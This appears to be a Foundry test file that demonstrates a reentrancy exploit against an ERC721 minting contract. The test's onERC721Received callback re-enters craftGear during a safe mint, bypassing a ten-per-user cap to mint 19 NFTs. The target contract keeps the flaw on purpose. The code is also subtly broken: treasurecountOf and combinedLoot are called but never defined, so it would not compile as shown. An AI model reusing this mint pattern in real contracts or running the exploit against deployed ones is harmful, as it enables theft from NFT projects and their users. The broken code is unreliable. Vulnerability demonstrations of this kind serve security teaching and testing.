// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract ContractTest is Test {
    MaxCreateitem721 MaxGenerateloot721Contract;
    bool complete;
    uint256 maxMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeCraftgear() public {
        MaxGenerateloot721Contract = new MaxCreateitem721();
        MaxGenerateloot721Contract.craftGear(maxMints);
        console.log("Bypassed maxMints, we got 19 NFTs");
        assertEq(MaxGenerateloot721Contract.treasurecountOf(address(this)), 19);
        console.log("NFT minted:", MaxGenerateloot721Contract.treasurecountOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (!complete) {
            complete = true;
            MaxGenerateloot721Contract.craftGear(maxMints - 1);
            console.log("Called with :", maxMints - 1);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract MaxCreateitem721 is ERC721Enumerable {
    uint256 public max_per_adventurer = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function craftGear(uint256 amount) external {
        require(
            treasurecountOf(msg.sender) + amount <= max_per_adventurer,
            "exceed max per user"
        );
        for (uint256 i = 0; i < amount; i++) {
            uint256 createitemIndex = combinedLoot();
            _safeMint(msg.sender, createitemIndex);
        }
    }
}
